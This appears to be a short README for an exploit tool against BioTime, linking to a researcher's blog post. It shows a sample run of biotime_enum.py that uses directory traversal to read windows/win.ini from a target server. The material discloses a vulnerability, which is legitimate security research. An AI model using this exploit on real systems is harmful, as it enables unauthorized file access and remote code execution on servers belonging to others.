# Biotime Directory Traversal, Remote Code Execution
The exploit covers several vulnerabilities in BioTime which lead to Remote Code Execution or atleast directory traversal. - @w3bd3vil

For more details read the blog post at
> https://krashconsulting.com/fury-of-fingers-biotime-rce/

```
└ $ python .\biotime_enum.py http://192.168.0.12:81
Found BioTime: 8.0.5 (Build:20211030.13012)
Dir Traversal Attempt
Output of windows/win.ini file:
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
CMCDLLNAME32=mapi32.dll
CMC=1
MAPIX=1
MAPIXVER=1.0.0.1
OLEMessaging=1
[...]
```
